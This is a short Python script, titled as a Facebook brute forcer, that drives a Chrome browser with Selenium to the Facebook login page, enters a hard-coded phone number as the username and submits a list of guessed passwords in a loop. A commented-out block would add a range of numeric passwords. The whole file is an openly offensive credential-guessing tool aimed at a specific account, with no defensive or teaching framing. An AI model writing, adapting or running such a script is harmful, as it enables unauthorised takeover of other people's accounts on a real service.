#Facebook Brute forcer
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time
a = ["idsbgdsab", "bgvsdgivuds", "dg654vsd64", "moother"]
'''def word_list(limit):
    for i in range(981170, limit):
        a.append(i)

word_list(999999)'''
driver = webdriver.Chrome(executable_path="C:\webdrivers\chromedriver.exe")
driver.get("https://www.facebook.com/")

username = driver.find_element_by_id("email")
username.send_keys("9540803789")
for k in a:
    passw = driver.find_element_by_id("pass")
    passw.send_keys(k)
    passw.send_keys(Keys.RETURN)
    time.sleep(2)



